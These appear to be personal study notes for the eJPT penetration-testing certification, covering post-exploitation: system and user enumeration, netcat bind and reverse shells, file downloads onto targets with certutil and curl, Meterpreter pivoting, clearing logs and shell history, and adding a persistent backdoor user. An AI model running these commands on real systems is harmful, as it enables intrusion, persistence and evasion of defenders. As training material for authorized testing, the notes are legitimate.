# eJPT Notes

## Information gathering

## Enumeration

## Exploitation

## Post-Exploitation

### Metasploit Post-Exploitation Modules

Windows:
- 

Also, automate postexploitation with JAWS:
Jaws Enum:
`upload jaws-enum.ps1`
`powershell.exe -ExecutionPolicy Bypass -File .\jaws-enum.ps1 -OutputFilename JAWS-enum.txt`
`download JAWS-enum.txt`

Linux:

Also, automate post-exploitation with `linenum.sh`

### Post-Exploitation on a regular shell

On Windows:
`ipconfig`
`ipconfig /all`
`route print`
`arp -a`
`netstat -ano`
Processes:
`ps`
`net start`
`wmic service list brief`
`tasklist /SVC`
`schtaskts /query /fo LIST`

On Linux:
Enumerating system info:
- `cat /etc/issue`
- `cat /etc/*release`
- `uname -a`
- `lscpu`
- `df -h`
Users
- `groups root`
- `cat /etc/passwd`
- `groups`
- `who`
- `lastlog`
Network info:
in meterpreter:
- `ifconfig`
- `netstat`
- `route`
In bash:
- `ip a s`
- `cat /etc/networks`
- `cat /etc/hosts`
- `cat /etc/resolv.conf`
Processes & jobs
- `pgrep vsftpd`
- `ps`
- `cat /etc/cron*`

### Shells

- `netcat` utility
    - Set up listener (server): `nc -lnvp 9999`
    - Establish connection (client): `nc -nv <ip-listener> 9999`
    - send files: Listener: `nc.exe -lnvp 9999 > file.txt`
    - send the file `nc -nv <IP-listener> 9999 < file.txt`
- Bind shells
    - Listener (victim): `nc.exe -nlvp 9999 -e cmd.exe`
    - Attacker: `nc -nv <victim-ip> 9999`
    - If linux is victim: `nc -nlvp 9999 -e /bin/bash`
    - Attacker: `nc.exe -nv <ip> 9999`
- Reverse shells with `netcat`
    - Listener (attacker): `nc -lnvp 9999`
    - Victim: `nc.exe -nv <attacker-ip> 9999 -e cmd.exe`

- Upgrading shells to `meterpreter`
    - `sessions -u 1`
    - `post/multi/manage/shell_to_meterpreter`

- Upgrading to an interactive shell:
    - `python -c 'import pty; pty.spawn("/bin/bash")'`
    - `perl -e 'exec "/bin/bash";'`
    - `/bin/bash -i`

### Transferring files to the target

Set up a web server:
- `python -m SimpleHTTPServer 80`
- `python3 -m http.server 80`
Download resources from that server:
- `certutil -urlcache -f http://<ip>/filename filename`
- `wget http://<ip>/filename`
- `curl http://<ip>/filename --output filename`

### Pivoting

On the meterpreter session:
`ipconfig`
`run autoroute -s 10.0.23.0/20`
`run autoroute -p` - show routes
`run arp_scanner -r 10.0.23.0/20`
`background`
`use auxiliary/scanner/portscan/tcp`

Port forwarding:
`portfwd add -l 9999 -p 80 -r <remotehost ip>`
`portfwd list`

### Clearing tracks

In Windows:
- On a `meterpreter` session: `clearev`
In Linux:
- Remove `/tmp/` directory
- `history -c`
- `cat /dev/null > ~/.bash_history`

### Persistence

`exploit/windows/local/persistence_service`

`run getgui -e -u hacker -p hacker_321`